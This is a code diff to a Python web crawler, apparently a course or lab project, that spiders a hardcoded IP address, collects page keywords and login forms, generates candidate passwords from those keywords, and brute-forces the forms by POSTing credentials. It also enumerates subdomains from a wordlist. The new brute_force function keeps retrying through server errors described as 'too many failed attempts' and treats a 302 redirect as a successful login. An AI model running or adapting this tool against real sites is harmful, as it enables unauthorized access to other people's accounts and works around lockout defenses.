@@ -1,16 +1,12 @@
 from html_parser import HTMLParser
-from requests import get_request, post_request, get_status
+from password_generator import generate_password_list
+from requests import get_request, get_status, post_request
 from url_utils import extract_url_parts, reformat_url
 
 import argparse
 import collections
-import password_generator
 import socket
-import nltk
-import time
 
-
-password_list = []
 SUBDOMAINS_FILE_PATH = './subdomains-100.txt'
 
 class Node:
@@ -117,55 +113,6 @@ def _crawl_dfs(start_url, node, header_dict, forms, keywords, seen, counter):
     add_to_stack = lambda url: _crawl_dfs(start_url, Node(url, node.depth + 1), header_dict, forms, keywords, seen, counter)
     process_node(start_url, node, header_dict, forms, keywords, seen, add_to_stack, counter) 
 
-def brute_force_pass(username ,url, header_dict, keywords):
-
-    print(username)
-    
-    url = reformat_url(url)
-    html = get_request(url, header_dict)
-    htmlParser = HTMLParser(html)
-    wordCount = 0
-    passwordSet = set()
-    for word in keywords:
-        print(word, '  :  ', password_generator.generate_password_list(word))
-        passwordSet.update(password_generator.generate_password_list(word))
-    
-    for word in passwordSet:
-        if (wordCount == 10):
-            word = 'IncognitoWebCrawl'
-
-        print('PASSWORD TESTED : ', word)
-        login_string = htmlParser.create_login_string(username, word)
-        post = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
-        'Content-Type': 'application/x-www-form-urlencoded',
-        'Content-Length': str(len(login_string))}
-        post_response = post_request(url, post, login_string)
-
-        while (get_status(post_response) > 500):
-            time.sleep(1)
-            post_response = post_request(url, post, login_string)
-        print('status code for word ', word, ' is : ', get_status(post_response))
-        if (get_status(post_response) == 302):
-            print('PASSWORD FOUND : ', word)
-            return
-        wordCount += 1
-    
-    print('PASSWORD NOT FOUND')
-
-def find_url_with_login(urlset):
-    for url in urlset:
-        print(url)
-        
-        url = reformat_url(url)
-        response = get_request(url, {})
-        parser = HTMLParser(response)
-        if (parser.detect_login_form()):
-            return url
-            
-    
-    print('LOGIN FORM NOT FOUND')
-
-
 def read_subdomains():
     with open(SUBDOMAINS_FILE_PATH, "r") as f:
         return {subdomain.rstrip() for subdomain in f}
@@ -182,47 +129,85 @@ def get_subdomains(url):
 
     return {subdomain + '.' + host for subdomain in subdomains}
 
+def crawl_subdomains(bfs, url, header_dict, page_counter):
+    for subdomain in get_subdomains(url):
+        try:
+            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            # Test whether subdomain exists 
+            conn.connect((subdomain, 80))
+            if bfs:
+                crawl_bfs(subdomain, header_dict, page_counter)
+            else:
+                crawl_dfs(subdomain, header_dict, page_counter)            
+        except socket.gaierror:
+            print('Subdomain ' + subdomain + ' was not found.')
+        finally:
+            conn.close()    
+            
+def brute_force(user, keywords, forms, user_agent):
+    passwords = set()
+    for word in keywords:
+        print(word, '  :  ', generate_password_list(word))
+        passwords.update(generate_password_list(word))
+
+    for form in forms:
+        print('\nAttempting to brute-force: ' + form + '\n')
+        get_header = {'User-Agent': user_agent}
+        html_doc = get_request(form, get_header)
+        parser = HTMLParser(html_doc)
+
+        for password in passwords:
+            login = parser.create_login_string(user, password)
+            post = {'User-Agent': user_agent,
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Length': str(len(login))}
+
+            response = post_request(form, post, login)
+            
+            if get_status(response) >= 500:
+                print('Hold on, too many failed attempts! Waiting for the server to accept more login requests...')
+            
+            # Continually retry logging in if there is a server error (too many failed attempts)
+            while get_status(response) >= 500:
+                response = post_request(form, post, login)
+            print('Attempting to login...\nUser: ' + user + '\nPassword: ' + password)
+            if get_status(response) == 302:
+                print('Login Succeeded!\n')
+                break
+            else:
+                print('Login Failed...\n')
+        
+        print('Ran out of passwords! Bruteforce failed!')
+          
 def main(username, maxdepth, maxpage, mode, header_dict):
     
     url = 'http://3.16.219.26/'
     url = reformat_url(url)
     page_counter = Counter(0, maxdepth, maxpage)
 
+    useragent = header_dict.get('User Agent')
+    useragent = useragent if useragent != None else ''
 
     if mode == 'bfs':
         """
         BFS
         """
-        keywords_bfs, forms_bfs, seen_bfs = crawl_bfs(url, {}, page_counter)
-        print('\n\nKeywords:', keywords_bfs, '\n\nForm:', forms_bfs, '\n\nSeen:', seen_bfs, sep=' ')
-        brute_force_pass(username, forms_bfs.pop(), header_dict, keywords_bfs)
+        keywords, forms, seen = crawl_bfs(url, header_dict, page_counter)
+        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
+        brute_force(username, keywords, forms, useragent)
     elif mode == 'dfs':
         """
         DFS
         """
-        keywords_dfs, forms_dfs, seen_dfs = crawl_dfs(url, header_dict, page_counter)
-        print('\n\nKeywords:', keywords_dfs, '\n\nForm:', forms_dfs, '\n\nSeen:', seen_dfs, sep=' ')
-        brute_force_pass(username, forms_dfs.pop(), header_dict, keywords_dfs)
+        keywords, forms, seen = crawl_dfs(url, header_dict, page_counter)
+        print('\n\nKeywords:', keywords, '\n\nForm:', forms, '\n\nSeen:', seen, sep=' ')
+        brute_force(username, keywords, forms, useragent)
     else:
-        print('\'{}\' is not supported as a search algorithm. Please use \'bfs\' or \'dfs\'!'.format(search_algo))
+        print('\'{}\' is not supported as a search algorithm. Please use \'bfs\' or \'dfs\'!'.format(mode))
         return
 
     print('\n\n\n', get_subdomains(url))
-    
-"""
 
-    for subdomain in get_subdomains(url):
-        try:
-            #Test whether subdomain exists 
-            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            conn.connect((subdomain, 80))
-
-            crawl_bfs(subdomain, {})            
-        except socket.gaierror:
-            print('Subdomain ' + subdomain + ' was not found.')
-        finally:
-            conn.close()
-"""
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description= 'Arguments to proceed web-crawling')
